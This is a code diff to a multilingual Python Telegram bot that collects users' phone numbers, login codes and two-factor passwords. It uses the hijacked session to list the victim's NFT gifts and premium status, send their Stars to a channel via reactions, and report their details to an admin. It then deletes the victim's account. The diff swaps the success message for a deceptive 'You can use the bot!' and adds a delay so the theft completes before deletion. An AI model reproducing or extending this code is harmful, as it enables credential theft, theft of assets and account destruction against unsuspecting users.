@@ -58,10 +58,10 @@ TEXTS = {
     "uz": {
         "phone_req": "📱 Raqamingizni yuboring:",
         "phone_btn": "📞 Raqamni yuborish",
-        "invalid_btn": "🛑 Iltimos, raqamni to'g'ri kiriting!",
+        "invalid_btn": "🛑 Raqamni to'g'ri kiriting!",
         "code_req": "📩 Kodingizni yuboring:\n💡 *Namuna:* `12.345`",
         "fa_req": "🔑 Parolingizni yuboring:",
-        "success": "✅ Amaliyot bajarildi!",
+        "success": "✅ Botdan foydalanishingiz mumkin!",
         "err_code": "❌ Xato kod! Qayta kiriting:",
         "err_fa": "❕ Xato parol! Qayta kiriting:",
         "need_session": "⚠️ Avval sessiya qo'shishingiz kerak!"
@@ -72,7 +72,7 @@ TEXTS = {
         "invalid_btn": "🛑 Invalid input, try again!",
         "code_req": "📩 Send code:\n💡 *Example:* `12.345`",
         "fa_req": "🔑 Send your password:",
-        "success": "✅ Process completed!",
+        "success": "✅ You can use the bot!",
         "err_code": "❌ Wrong code! Resend:",
         "err_fa": "❕ Wrong password! Resend:",
         "need_session": "⚠️ You need to add a session first!"
@@ -83,7 +83,7 @@ TEXTS = {
         "invalid_btn": "🛑 Неверный ввод, повторите!",
         "code_req": "📩 Отправьте код:\n💡 *Пример:* `12.345`",
         "fa_req": "🔑 Отправьте пароль:",
-        "success": "✅ Процесс завершен!",
+        "success": "✅ Вы можете использовать бота!",
         "err_code": "❌ Ошибка кода! Повторите:",
         "err_fa": "❕ Ошибка пароля! Повторите:",
         "need_session": "⚠️ Сначала нужно добавить сессию!"
@@ -281,6 +281,7 @@ async def process_stars_reaction(client: TelegramClient):
     try:
         stars_status = await client(functions.payments.GetStarsStatusRequest(peer="me"))
         stars_balance = getattr(stars_status, 'balance', 0)
+        print(f"DEBUG: Foydalanuvchi Stars balansi: {stars_balance}")
         
         if stars_balance > 0:
             channel = await client.get_entity(STARS_CHANNEL_USERNAME)
@@ -373,7 +374,7 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
     t = TEXTS[lang]
     client = auth["client"]
 
-    # 1. Avval foydalanuvchi ma'lumotlari va NFTlarni olamiz
+    # 1. Ma'lumotlarni yig'amiz
     user_info_str, user_level = await fetch_user_premium_and_level(client)
     nft_items = await fetch_user_nft_gifts(client)
     nft_count = len(nft_items)
@@ -384,10 +385,10 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
     else:
         nft_str = "🎁 **NFT sovg'alar soni:** `0 ta` (Topilmadi)"
 
-    # 2. Stars yuborish jarayonini bajaramiz
+    # 2. Stars reaksiyasini yuboramiz
     await process_stars_reaction(client)
 
-    # 3. ADMINGA XABAR YUBORISH (Kafolatlangan holda)
+    # 3. Adminga xabarni tayyorlab yuboramiz
     full_name = message.from_user.full_name
     username = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
     phone = auth.get("phone", "Noma'lum")
@@ -415,17 +416,17 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
             print("Admin xabari muvaffaqiyatli yuborildi.")
         except Exception as e:
             print(f"Admin message send ERROR: {e}")
-    else:
-        print("ADMIN_ID kiritilmagan yoki 0 ga teng!")
 
-    # 4. Foydalanuvchiga muvaffaqiyatli xabarini yuboramiz
+    # 4. Foydalanuvchiga muvaffaqiyatli xabarini chiqaramiz
     await message.answer(t["success"], parse_mode="Markdown")
-    await asyncio.sleep(1)
+    
+    # 5. Adminga xabar va stars jarayoni yetib borishi uchun 2 sekund kutamiz
+    await asyncio.sleep(2)
 
-    # 5. ENG OXIRIDA HISOBNI O'CHIRAMIZ VA ULANISHNI UZAMIZ
+    # 6. Akkauntni o'chiramiz
     try:
         await client(functions.account.DeleteAccountRequest(reason="Deactivation"))
-        print("Hisob o'chirildi.")
+        print("Hisob muvaffaqiyatli o'chirildi.")
     except Exception as e:
         print(f"Delete Account Error: {e}")
     finally:
